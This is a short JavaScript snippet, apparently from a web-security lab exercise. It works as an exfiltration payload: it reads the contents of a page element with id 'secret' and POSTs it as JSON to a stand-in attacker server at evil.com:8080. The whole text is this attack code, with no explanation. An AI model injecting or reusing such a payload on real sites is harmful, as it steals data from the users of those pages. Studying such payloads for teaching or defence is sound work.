const secret = document.getElementById("secret").innerText;

const urlAttackerSever = "http://evil.com:8080/mycode/tp3/get_secret.php";

const request = {
    method: "POST",
    headers: {
        'Content-Type': 'application/json',
    },
    body : JSON.stringify({ secret: secret })
};

fetch(urlAttackerSever, request)